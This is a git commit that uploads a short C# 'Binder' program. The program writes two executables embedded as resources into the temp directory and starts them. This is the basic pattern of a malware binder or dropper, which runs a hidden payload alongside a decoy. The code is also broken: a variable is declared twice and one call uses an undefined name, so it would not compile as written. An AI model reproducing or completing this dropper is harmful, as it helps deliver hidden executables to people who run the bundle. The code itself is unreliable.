aaf11db261dcbbfe20c868651043be1fcf2ad398
B1naryo <sandro520099@hotmail.com>
2024-01-03 19:16:28 -0300

    Add files via upload

---
+++ binder.cs
@@ -0,0 +1,32 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Windows.Forms;
+using System.IO;
+using System.Text;
+using Microsoft.Win32;
+using System.Diagnostics;
+
+namespace Binder
+{
+    static class Program
+    {
+       
+        static void Main()
+        {
+            Application.EnableVisualStyles();
+            Application.SetCompatibleTextRenderingDefault(false);
+
+            string path = Path.Combine(Path.GetTempPath(), "file1.exe");
+            File.WriteAllBytes(path, Binder.Properties.Resources.file1);
+
+            string path = Path.Combine(Path.GetTempPath(), "file2.exe");
+            File.WriteAllBytes(path, Binder.Properties.Resources.file2);
+                
+            
+            System.Diagnostics.Process.Start(path);
+            System.Diagnostics.Process.Start(pat);
+
+        }
+    }
+}
